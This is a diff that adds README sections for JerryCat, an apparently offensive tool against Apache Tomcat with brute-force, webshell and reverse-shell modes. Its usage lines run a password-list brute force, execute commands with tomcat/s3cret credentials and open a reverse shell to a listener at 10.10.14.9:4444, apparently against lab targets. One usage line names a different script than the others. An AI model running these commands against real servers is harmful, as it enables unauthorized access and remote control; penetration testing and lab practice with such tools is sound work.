@@ -13,3 +13,36 @@
   </a>
 </p>
 
+## Features/Mode ⚒️
+
+ - [x] Brute Force (brute)
+ - [x] Webshell (exec)
+ - [x] Reverse shell (reverse)
+
+## Setup ✨
+
+Clone & install dependencies
+```sh
+$ git clone https://github.com/TheF0rceAwak5ns/JerryCat.git && cd JerryCat && pip install -r requirements.txt
+```
+
+## Usage - Unauthenticated attack 
+
+### Brute Force
+```sh
+$ python3 jerrycat.py brute http://10.10.10.95:8080/ -w /user/share/wordlists/rockyou.txt
+```
+
+## Usage - Authenticated attack
+
+### Webshell
+```sh
+$ python3 jerrycat.py exec http://10.10.10.95:8080/ -u tomcat -p s3cret
+```
+
+### Reverse shell
+```sh
+$ python3 talace.py reverse http://10.10.10.95:8080/ -u tomcat -p s3cret --lhost 10.10.14.9 --lport 4444
+```
+
+
